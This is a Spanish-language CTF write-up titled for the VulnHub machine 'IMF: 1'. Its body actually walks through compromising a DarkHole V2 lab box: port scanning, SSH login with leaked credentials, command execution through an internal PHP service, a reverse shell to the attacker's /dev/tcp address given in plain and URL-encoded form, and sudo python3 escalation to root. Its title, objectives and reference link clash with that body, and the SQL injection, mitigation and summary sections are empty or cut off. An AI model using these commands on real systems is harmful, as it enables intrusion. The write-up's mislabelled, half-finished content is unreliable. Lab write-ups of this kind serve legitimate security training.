---
title: "VulnHub: IMF: 1"
date: 2025-10-31
tags:
  - writeup
  - vulnhub
  - sqli
  - ssh
  - privilege-escalation
  - web-exploitation
related:
  - "[[SQLi-Manual]]"
  - "[[Git-Reconnaissance]]"
  - "[[Linux-Privesc]]"
  - "[[SSH-Techniques]]"
references:
  - https://www.vulnhub.com/entry/darkhole-2,740/
---
# CTF: IMF: 1

PORTADA

>[!INFO] Información General
>Este documento contiene un writeup detallado de cómo comprometer la máquina IMF en VulnHub. Se abordan técnicas de
---
## Objetivo

- Comprometer la máquina virtual [IMF: 1](https://www.vulnhub.com/entry/imf-1,162/).
- Obtener acceso inicial mediante enumeración web.
- Escalar privilegios hasta root mediante abuso de servicios vulnerables.
- Capturar las 5 flags.
## Herramientas y Comandos Recomendados

| Herramienta | Función principal                             |
| ----------- | --------------------------------------------- |
| arp-scan    | Descubre hosts en la red.                     |
| nmap        | Escaneo y enumeración de puertos y servicios. |
| wget        | Descarga de archivos desde la web.            |
| git         | Control de versiones de código.               |
| Burp Suite  | Análisis y pruebas de tráfico web.            |
| curl        | Transferencia de datos y pruebas HTTP.        |
| netcat      | Utilidad multipropósito de red.               |
| ssh         | Acceso remoto seguro por consola.             |
| htop        | Monitorización avanzada de procesos.          |
| netstat     | Revisión de conexiones y puertos activos.     |
> [!TIP] Preparativos Personales:  
>Esta máquina vulnerable fue ejecutada bajo un entorno virtualizado usando **VMware Workstation** sobre un sistema operativo **Arch Linux**. Todas las herramientas fueron descargadas e instaladas de los repositorios oficiales o desde la **AUR**. 

---
# Informe General:

> [!Abstract] Resumen Técnico
> Se obtuvo acceso inicial 
## I. Reconocimiento: Fase inicial | arp-scan / tcping

Lo primero que debes hacer antes de hacer cualquier cosa es reconocer que maquina vas a atacar. Para esto debe reconocer que IP tiene la máquina victima.

Comando utilizado:
```
arp-scan -I vmnet1 --localnet
```

Parámetros:
- `arp-scan`: Herramienta de reconocimiento de red
- `-I`: Especifica el adaptador de red a escanear
- `--localnet`: Indica escaneo de toda la red local

![[Pasted image 20251031173658.png]]
	El escaneo identifica la máquina objetivo en "`172.16.23.129`" dentro de mi red `vmnet1`.

Indentificamos que hay una maquina conectada, por lo que podemos proceder ejecutar el comando ping para verificar conectividad con la máquina:

Comando utilizado
```
ping 172.16.23.129
```
![[Pasted image 20251031174154.png]]
	No hay conexión por medio de ping.

El comando "ping" usa el protocolo ICMP (Internet Control Message Protocol), que envía paquetes de eco para saber si un dispositivo está accesible en la red. Sin embargo, muchos sistemas o routers pueden bloquear estos paquetes ICMP por seguridad, por lo que "ping" puede fallar aunque el dispositivo esté activo.

Ya que no hay conexión mediante conexiones ICMP, probaremos la herramienta [tcping](https://github.com/cloverstd/tcping) para verificar la conexión mediante el protocolo TCP. tcping usa el protocolo TCP  para intentar establecer una conexión directa a un puerto TCP específico en la máquina destino (por ejemplo, puerto 80, 443, etc). Esto permite verificar si un servicio en ese puerto está disponible y funcionando, y no se basa en que ICMP esté permitido o no.

Una vez copilada ejecutamos:
```
./tcping 172.16.23.129
```
![[Pasted image 20251031175656.png]]
	Si podemos confirmar conexión por medio de la herramienta tcping.


### 1.1 Reconocimiento: Escaneo de puerto | nMap

```
nmap -p- --open -sS 172.16.23.129 -T4 -n -vvv -Pn -oA nmap 
```

Parámetros:
- `-p-`: Escanea todos los puertos TCP del host, del puerto 1 al 65535.
- `--open`: Solo muestra los puertos que están abiertos, ignorando los cerrados o filtrados.
- `-sS`: Realiza un escaneo SYN stealth (Half-open scan), que envía paquetes SYN para detectar puertos abiertos sin completar la conexión TCP (menos detectable).
- `172.16.23.129`: Es la dirección IP del objetivo o máquina a escanear.
- `-T4`: Ajusta la velocidad del escaneo a un nivel agresivo (más rápido, menos sigiloso).
- `-n`: No resuelve nombres DNS para las IPs, acelera el escaneo al evitar consultas DNS.
- `-vvv`: Muestra salida muy detallada (nivel de verbosidad triple).
- `-Pn`: No realiza ping previo para detectar si el host está activo; asume que está activo y escanea directamente.
- `-oA nmap`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".

![[Pasted image 20251031182855.png]]

### Reconocimiento: Scripts de Reconocimiento | nmap

Comando utilizado:
```
nmap -p80 -sCV 172.16.23.129 -oA PORTscan   
```

Parámetros:
- `nmap`: Herramienta de escaneo de redes.
- `-p- --open`: Escanea los 65535 puertos y reporta solo los abiertos.
- `-sVC`: Detecta servicios y ejecuta scripts básicos de reconocimiento
- `-T4`: Plantilla de velocidad agresiva
- `-vvv`: Salida verbose en tiempo real, útil para ver información en tiempo real.
- `-n`: Deshabilita resolución DNS para acelerar el escaneo
- `-Pn`: Omite host discovery y fuerza el reconocimiento de puertos
- `-oA SYNscan`: Exporta la salida en tres formatos simultáneamente (normal, XML y grepable) usando el prefijo de archivo "nmap".


| Puerto | Protocolo | Servicio     | Versión                 | Observaciones               |
| :----: | :-------: | :----------- | :---------------------- | :-------------------------- |
| 22/tcp |    SSH    | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.3 | Potencial acceso remoto     |
| 80/tcp |   HTTP    | Apache httpd | 2.4.41 (Ubuntu)         | Aplicación web: DarkHole V2 |
En la tabla se puede ve que tal

#### Puerto

#### Puerto 2


---
## II. Explotación

### Vulnerabilidad: 

#### Explotación con

#### Proceso de explotación: SQL


> [!success] Credenciales SSH Obtenidas
> Usuario: jehad  
> Contraseña: fool

### Obtención de Shell SSH

Comando:
```
ssh jehad@172.16.23.128
```
![[darkhole_2.18.png]]
	Acceso exitoso a la máquina como usuario jehad.

---
## III. Post-Explotación y Privesc

### Enumeración Interna

**Inventario del sistema:**

Comando para ver kernel:
```
uname -a
```
![[darkhole_2.34.png]]
	Resultado: Linux darkhole 5.4.0-81-generic 91-Ubuntu SMP Thu Jul 15 19:09:17 UTC 2021 x86_64

Comando para ver versión del SO:
```
cat /etc/os-release
```
![[darkhole_2.33.png]]
	Resultado: Ubuntu 20.04.3 LTS (Focal Fossa)

Comando para verificar privilegios sudo:
```
sudo -l
```
![[darkhole_2.32.png]]
	Resultado: El usuario jehad no tiene permisos sudo.

Comando para ver grupos:
```
id
```
![[darkhole_2.31.png]]
	Resultado: jehad no pertenece a grupos privilegiados.

Comando para listar usuarios:
```
cat /etc/passwd
```
![[darkhole_2.30.png]]
	Usuarios con bash: root (UID 0), lama (UID 1000), jehad (UID 1001), losy (UID 1002).

Comando para ver historial:
```
history
```
![[darkhole_2.19.png]]
	Comandos críticos del historial:
	1. cd /home/losy
	2. cd /opt/web
	3. curl "http://localhost:9999/?cmd=id"
	4. ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129

> [!tip] ¡Servicio Interno Detectado!
> Gracias a los comandos ejecutados por el usuarios podemos entender que existe un servicio web interno en puerto 9999 con capacidad de ejecución remota de comandos.

Comando para listar puertos en escucha:
```
netstat -tulpn
```
![[darkhole_2.20.png]]
	Confirmación: servicio en **LISTEN** bajo puerto 9999.

Comando para ver procesos:
```
htop
```
![[darkhole_2.21.png]]
	El servicio corre como usuario losy, servidor PHP ubicado en /opt/web.

Comandos para revisar el script PHP:
```
cd /opt/web
cat index.php
```
![[darkhole_2.22.png]]
	Script PHP simple para ejecución remota de comandos vía parámetro cmd.

### Vector de Escalada

Exploración del directorio home:
![[darkhole_2.23.png]]
	Se encontró la flag user.txt en /home/.

#### Explotación del Servicio Interno

Prueba de concepto con curl:
```
curl "http://localhost:9999/?cmd=id"
```
![[darkhole_2.24.png]]
	El comando se ejecuta como usuario losy, confirmando RCE.

#### Reverse Shell como losy

Listener en máquina atacante:
```
nc -lvnp 443
```
![[darkhole_2.25.png]]
	Nos podemos en escucha para recibir la señal que vamos a enviar desde el servicio PHP.

Para mandar el payload lo debemos hacer en formato "URL Encode". Les dejo un ejemplo de como se vería el comando de forma "normal" y "URL Encoded".

Comando original:
```
curl "http://localhost:9999/?cmd=bash -c 'bash -i >& /dev/tcp/172.16.23.1/443 0>&1'
```

URL Encoded:
```
curl "http://localhost:9999/?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.16.23.1/443%200%3E%261'"
```
![[darkhole_2.26.png]]
	Shell inversa obtenida como losy.

> [!WARNING] Advertencia  
> Una vez establecida la conexión remota mediante netcat, la terminal puede no estar completamente operativa para la interacción directa. Por ello, es recomendable ejecutar un proceso de estabilización antes de continuar con la auditoría, asegurando así un entorno de trabajo más estable y funcional.
#### Estabilización de TTY

Comandos para estabilizar la shell:
```
/usr/bin/script -qc /bin/bash /dev/null
```
Luego CTRL+Z y ejecutar:
```
stty raw -echo; fg
```
Finalmente:
```
export TERM=xterm
```

> [!danger] Información Crítica en Historial
> Comandos encontrados:
> 1. sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
> 2. sudo python3 -c 'import os; os.system("/bin/sh")'
> 3. P0assw0rd losy:gang (credenciales expuestas)
> 
> Esto nos confirma que el usuario losy tiene permisos sudo para ejecutar Python como root bajo la credencial "gang".

### Escalada a Root
Comando para obtener shell root:
```
sudo python3 -c 'import os; os.system("/bin/sh")'
```
![[darkhole_2.0.png]]
	Shell de root obtenida. Flag root.txt capturada en directorio /root.

---
## Evidencias
1. Comando `whoami` y hostname ejecutado como root:
	![[darkhole_2.35.png]]

Flags capturadas:
- user.txt: `capturada en /home/`.
- root.txt: `capturada en /root/`.

> [!tip] Buenas prácticas de evidencia
> Todos los comandos, payloads y respuestas del servidor fueron documentados con capturas de pantalla para su reproducibilidad.

---
## Mitigación y Recomendaciones



---
## Conclusiones

**Lecciones aprendidas:** La exposición de repositorios Git con historial completo es una vulnerabilidad crítica que puede llevar a la filtración de credenciales. La inyección SQL manual sigue siendo efectiva cuando la validación de entradas es nula. Los servicios internos mal configurados y el historial de bash sin limpiar son vectores de escalada comunes.

### Comparación con entornos reales:

La dificultad media es apropiada. Requiere conocimientos sólidos de enumeración web, SQLi manual y pensamiento lateral para identificar servicios locales.